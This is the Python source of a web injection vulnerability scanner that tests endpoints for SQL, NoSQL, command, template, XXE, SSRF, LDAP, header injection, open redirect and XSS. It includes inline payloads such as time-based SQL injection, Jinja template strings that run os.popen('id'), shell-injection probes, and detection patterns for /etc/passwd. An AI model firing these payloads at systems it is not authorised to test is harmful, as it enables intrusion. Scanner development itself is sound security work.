"""Injection vulnerability scanner.

Generates and tests payloads for SQL injection, NoSQL injection, command injection,
SSRF, path traversal, XXE, SSTI, LDAP injection, header injection, and open redirect.
Adapts payloads based on fingerprinted framework.
"""

from __future__ import annotations

import re
from pathlib import Path
from urllib.parse import parse_qs, urlencode, urlparse

import yaml

from stryx.utils.evidence import Finding, Severity
from stryx.utils.http_client import HttpClient
from stryx.utils.logging import get_logger

logger = get_logger("scanner.injection")

PAYLOADS_DIR = Path(__file__).parent.parent / "payloads"
SIGNATURES_DIR = Path(__file__).parent.parent / "signatures"

# Detection patterns for each injection type
DETECTION_PATTERNS = {
    "sqli": [
        r"sql syntax",
        r"mysql",
        r"sqlite",
        r"postgresql",
        r"ORA-\d{5}",
        r"Microsoft SQL",
        r"syntax error",
        r"unterminated",
        r"query failed",
        r"database error",
        r"SQLSTATE",
        r"mysql_fetch",
        r"pg_query",
        r"SQLite3::",
    ],
    "nosqli": [
        r"MongoError",
        r"MongoServerError",
        r"mongo",
        r"bson",
        r"\$where",
        r"\$gt",
    ],
    "cmdi": [
        r"root:",
        r"uid=",
        r"www-data",
        r"/bin/bash",
        r"/bin/sh",
        r"Linux version",
        r"Docker",
    ],
    "path_traversal": [
        r"root:",
        r"\[boot loader\]",
        r"/etc/passwd",
        r"/etc/shadow",
        r"root:x:0:0",
    ],
    "ssti": [
        r"49",  # 7*7
        r"14",  # 7+7
        r"<class",
        r"<type",
        r"subclasses",
    ],
    "xxe": [
        r"root:",
        r"<!DOCTYPE",
        r"\[xml\]",
    ],
    "ssrf": [
        r"Connection refused",
        r"connect to",
        r"No route to host",
        r"timed out",
        r"Failed to connect",
    ],
    "ldap": [
        r"ldap",
        r"invalid syntax",
        r"operations error",
        r"protocol error",
        r"no such object",
        r"unwilling to perform",
    ],
    "header_injection": [
        r"Content-Type:",
        r"X-",
        r"Location:",
        r"Set-Cookie:",
        r"Transfer-Encoding:",
    ],
    "open_redirect": [
        r"redirect",
        r"location",
        r"moved",
        r"301",
        r"302",
        r"303",
        r"307",
        r"308",
    ],
    "xss": [
        r"<script>alert\(1\)</script>",
        r"<script>alert\('XSS'\)</script>",
        r"<script>alert\(document\.cookie\)</script>",
        r"<img src=x onerror=alert\(1\)>",
        r"<svg onload=alert\(1\)>",
        r"javascript:alert\(1\)",
        r"<body onload=alert\(1\)>",
        r"<iframe src=\"javascript:alert\(1\)\">",
    ],
}


def _load_payloads(category: str) -> list[str]:
    """Load payloads from the payloads directory."""
    payload_file = PAYLOADS_DIR / f"{category}.txt"
    if payload_file.exists():
        content = payload_file.read_text()
        return [line.strip() for line in content.splitlines() if line.strip()]
    return []


def _load_framework_signatures() -> dict:
    """Load framework fingerprint signatures."""
    sig_file = SIGNATURES_DIR / "framework_fingerprints.yaml"
    if sig_file.exists():
        with open(sig_file) as f:
            return yaml.safe_load(f) or {}
    return {}


class InjectionScanner:
    """Scanner for injection vulnerabilities."""

    def __init__(self, client: HttpClient):
        self.client = client
        self.framework: str | None = None
        self._signatures = _load_framework_signatures()

    def fingerprint_framework(self, response_headers: dict[str, str], body: str = "") -> str | None:
        """Fingerprint the target framework from response."""
        frameworks = self._signatures.get("frameworks", {})

        for fw_key, fw_data in frameworks.items():
            for header_pattern in fw_data.get("headers", []):
                if ":" in header_pattern:
                    h_name, h_value = header_pattern.split(":", 1)
                    h_name = h_name.strip().lower()
                    h_value = h_value.strip().lower()
                    actual_value = response_headers.get(h_name, "").lower()
                    if h_value in actual_value:
                        self.framework = fw_key
                        logger.info(f"Detected framework: {fw_data.get('name', fw_key)}")
                        return fw_key
        return None

    async def scan(
        self,
        endpoints: list[str],
        base_url: str,
        max_payloads_per_type: int | None = None,
    ) -> list[Finding]:
        """Run injection tests against all endpoints.

        Args:
            endpoints: List of endpoint URLs to test.
            base_url: Base URL of the target.
            max_payloads_per_type: Max payloads per injection type (None = all).
        """
        findings: list[Finding] = []
        logger.info("Running injection scanner")

        # Test each injection type (all 11)
        injection_types = [
            ("sqli", "SQL Injection"),
            ("nosqli", "NoSQL Injection"),
            ("cmdi", "Command Injection"),
            ("path_traversal", "Path Traversal"),
            ("ssti", "Server-Side Template Injection"),
            ("xxe", "XML External Entity"),
            ("ssrf", "Server-Side Request Forgery"),
            ("ldap", "LDAP Injection"),
            ("header_injection", "Header Injection"),
            ("open_redirect", "Open Redirect"),
            ("xss", "Cross-Site Scripting (XSS)"),
        ]

        for category, name in injection_types:
            payloads = _load_payloads(category)
            if not payloads:
                logger.warning(f"No payloads found for {category}")
                continue

            # Adapt payloads based on detected framework
            payloads = self._adapt_payloads(category, payloads)

            # Limit payloads if specified (for testing)
            if max_payloads_per_type is not None:
                payloads = payloads[:max_payloads_per_type]

            logger.info(f"Testing {name} ({len(payloads)} payloads)")

            for endpoint in endpoints:
                try:
                    result = await self._test_injection(
                        endpoint, category, name, payloads
                    )
                    if result:
                        findings.append(result)
                except Exception as e:
                    logger.debug(f"Injection test error on {endpoint}: {e}")

        logger.info(f"Injection scanner found {len(findings)} findings")
        return findings

    async def _test_injection(
        self,
        endpoint: str,
        category: str,
        name: str,
        payloads: list[str],
    ) -> Finding | None:
        """Test a single endpoint for a specific injection type."""
        parsed = urlparse(endpoint)
        params = parse_qs(parsed.query)

        # Special handling for header injection
        if category == "header_injection":
            return await self._test_header_injection(endpoint, name, payloads)

        # Special handling for open redirect
        if category == "open_redirect":
            return await self._test_open_redirect(endpoint, name, payloads)

        # Standard query parameter testing
        if params:
            for param_name in params:
                for payload in payloads[:10]:  # Limit payloads per param
                    try:
                        # Build test URL
                        test_params = dict(params)
                        test_params[param_name] = [payload]
                        test_url = (
                            f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                            f"?{urlencode(test_params, doseq=True)}"
                        )

                        response, evidence = await self.client.get(test_url)

                        # Check for injection indicators
                        if self._detect_injection(response.text, category):
                            evidence.confidence = 0.8
                            evidence.payload = payload
                            return Finding(
                                title=f"{name} in parameter '{param_name}'",
                                severity=Severity.CRITICAL,
                                evidence=evidence,
                                description=(
                                    f"Injectable payload in parameter '{param_name}' "
                                    f"caused a detectable response indicating {name}."
                                ),
                                remediation=(
                                f"Sanitize and validate '{param_name}' parameter. "
                                f"Use parameterized queries."
                            ),
                                cwe=self._get_cwe(category),
                                owasp="A03:2021 - Injection",
                                scanner="injection",
                                tags=[category, "injection"],
                            )
                    except Exception:
                        continue

        # Test POST body if no query params
        else:
            for payload in payloads[:5]:
                try:
                    response, evidence = await self.client.post(
                        endpoint,
                        body=payload,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                    )
                    if self._detect_injection(response.text, category):
                        evidence.confidence = 0.7
                        evidence.payload = payload
                        return Finding(
                            title=f"{name} in request body",
                            severity=Severity.CRITICAL,
                            evidence=evidence,
                            description=(
                                f"Injectable payload in request body caused a "
                                f"detectable response indicating {name}."
                            ),
                            remediation="Sanitize and validate all user input. Use parameterized queries.",
                            cwe=self._get_cwe(category),
                            owasp="A03:2021 - Injection",
                            scanner="injection",
                            tags=[category, "injection"],
                        )
                except Exception:
                    continue

        return None

    async def _test_header_injection(
        self, endpoint: str, name: str, payloads: list[str]
    ) -> Finding | None:
        """Test for HTTP header injection."""
        # Header injection payloads are typically CRLF sequences
        for payload in payloads[:10]:
            try:
                # Test via query parameter (most common injection point)
                parsed = urlparse(endpoint)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?input={payload}"
                response, evidence = await self.client.get(test_url)

                # Check if injected headers appear in response
                response_headers = dict(response.headers)
                for header_name in response_headers:
                    if header_name.lower().startswith(("x-", "content-", "location")):
                        # Check if the header contains our payload
                        if payload.strip() in response_headers[header_name]:
                            evidence.confidence = 0.8
                            evidence.payload = payload
                            return Finding(
                                title=f"{name} via HTTP header",
                                severity=Severity.HIGH,
                                evidence=evidence,
                                description=(
                                    "CRLF injection payload caused injected headers "
                                    "in the response, allowing HTTP header injection."
                                ),
                                remediation="Sanitize user input to prevent CRLF injection.",
                                cwe=self._get_cwe("header_injection"),
                                owasp="A03:2021 - Injection",
                                scanner="injection",
                                tags=["header_injection", "injection", "crlf"],
                            )
            except Exception:
                continue

        return None

    async def _test_open_redirect(
        self, endpoint: str, name: str, payloads: list[str]
    ) -> Finding | None:
        """Test for open redirect vulnerabilities."""
        parsed = urlparse(endpoint)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for payload in payloads[:10]:
            try:
                # Build URL with redirect parameter
                test_url = f"{base}{parsed.path}?next={payload}&redirect={payload}&url={payload}"
                response, evidence = await self.client.get(test_url, follow_redirects=False)

                # Check for redirects
                if response.status_code in (301, 302, 303, 307, 308):
                    location = response.headers.get("location", "")
                    # Check if redirect goes to external domain
                    if location and not location.startswith("/") and not location.startswith(base):
                        evidence.confidence = 0.8
                        evidence.payload = payload
                        return Finding(
                            title=f"{name} to external domain",
                            severity=Severity.HIGH,
                            evidence=evidence,
                            description=(
                                f"The application redirects to an external URL: {location}. "
                                f"This could be exploited for phishing attacks."
                            ),
                            remediation="Validate redirect URLs against a whitelist of allowed domains.",
                            cwe=self._get_cwe("open_redirect"),
                            owasp="A01:2021 - Broken Access Control",
                            scanner="injection",
                            tags=["open_redirect", "injection", "redirect"],
                        )
            except Exception:
                continue

        return None

    def _adapt_payloads(self, category: str, payloads: list[str]) -> list[str]:
        """Adapt payloads based on the detected framework.

        Adds framework-specific payloads and modifies existing ones
        based on the target's SQL dialect and injection modifiers.
        """
        if not self.framework or not self._signatures:
            return payloads

        fw_data = self._signatures.get("frameworks", {}).get(self.framework, {})
        if not fw_data:
            return payloads

        adapted = list(payloads)
        sql_dialect = fw_data.get("sql_dialect", "generic")

        # Add dialect-specific SQL injection payloads
        if category == "sqli":
            if sql_dialect == "postgres":
                adapted.extend([
                    "1; SELECT pg_sleep(5)--",
                    "1' AND pg_sleep(5)--",
                    "1; WAITFOR DELAY '0:0:5'--",
                ])
            elif sql_dialect == "mysql":
                adapted.extend([
                    "1; SLEEP(5)--",
                    "1' AND SLEEP(5)--",
                    "1; SELECT BENCHMARK(10000000,SHA1('test'))--",
                ])
            elif sql_dialect == "mssql":
                adapted.extend([
                    "1; WAITFOR DELAY '0:0:5'--",
                    "1'; WAITFOR DELAY '0:0:5'--",
                ])

        # Add framework-specific SSTI payloads
        if category == "ssti":
            fw_name = fw_data.get("name", "").lower()
            if "flask" in fw_name or "django" in fw_name:
                adapted.extend([
                    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                    "{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}",
                ])
            elif "express" in fw_name or "node" in fw_name:
                adapted.extend([
                    "${7*7}",
                    "#{7*7}",
                ])
            elif "spring" in fw_name or "java" in fw_name:
                adapted.extend([
                    "${7*7}",
                    "<%= 7*7 %>",
                ])
            elif "laravel" in fw_name or "php" in fw_name:
                adapted.extend([
                    "{{7*7}}",
                    "${7*7}",
                ])

        # Add framework-specific XSS payloads (Jinja2/Twig/Django templates)
        if category == "xss":
            fw_name = fw_data.get("name", "").lower()
            if "flask" in fw_name:
                adapted.extend([
                    "{{ '<script>alert(1)</script>' }}",
                    "{{ '<img src=x onerror=alert(1)>' }}",
                ])
            elif "django" in fw_name:
                adapted.extend([
                    "{{ '<script>alert(1)</script>'|safe }}",
                ])
            elif "express" in fw_name:
                adapted.extend([
                    "<%= '<script>alert(1)</script>' %>",
                    "<%- '<script>alert(1)</script>' %>",
                ])

        # Add framework-specific command injection payloads
        if category == "cmdi":
            fw_name = fw_data.get("name", "").lower()
            if "linux" in fw_name or "python" in fw_name or "ruby" in fw_name:
                adapted.extend([
                    "`id`",
                    "$(id)",
                    "; id",
                    "| id",
                ])
            elif "windows" in fw_name or ".net" in fw_name:
                adapted.extend([
                    "& whoami",
                    "| whoami",
                    "&& whoami",
                ])

        return adapted

    def _detect_injection(self, response_body: str, category: str) -> bool:
        """Check response for injection indicators."""
        patterns = DETECTION_PATTERNS.get(category, [])
        body_lower = response_body.lower()
        return any(re.search(p, body_lower, re.IGNORECASE) for p in patterns)

    def _get_cwe(self, category: str) -> str:
        """Map injection type to CWE."""
        cwe_map = {
            "sqli": "CWE-89",
            "nosqli": "CWE-943",
            "cmdi": "CWE-78",
            "path_traversal": "CWE-22",
            "ssti": "CWE-96",
            "xxe": "CWE-611",
            "ssrf": "CWE-918",
            "ldap": "CWE-90",
            "header_injection": "CWE-113",
            "open_redirect": "CWE-601",
            "xss": "CWE-79",
        }
        return cwe_map.get(category, "CWE-74")
